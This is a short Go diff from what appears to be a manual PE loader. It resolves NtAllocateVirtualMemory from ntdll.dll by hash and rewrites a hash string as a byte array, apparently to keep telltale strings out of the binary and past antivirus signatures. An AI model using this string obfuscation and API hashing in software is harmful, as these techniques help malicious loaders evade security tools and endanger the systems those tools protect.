@@ -149,7 +149,7 @@ func copySections(pefile *pe.File, image *[]byte, loc uintptr) error {
 
 //NtAllocateVirtualMemory
 func NvA(addr, size uintptr, allocType, protect uint32) (uintptr, error) {
-	procVA, _, e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "04262a7943514ab931287729e862ca663d81f515", str2sha1)
+	procVA, _, e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), string([]byte{'0', '4', '2', '6', '2', 'a', '7', '9', '4', '3', '5', '1', '4', 'a', 'b', '9', '3', '1', '2', '8', '7', '7', '2', '9', 'e', '8', '6', '2', 'c', 'a', '6', '6', '3', 'd', '8', '1', 'f', '5', '1', '5'}), str2sha1)
 	if procVA == 0 {
 		return 0, e
 	}
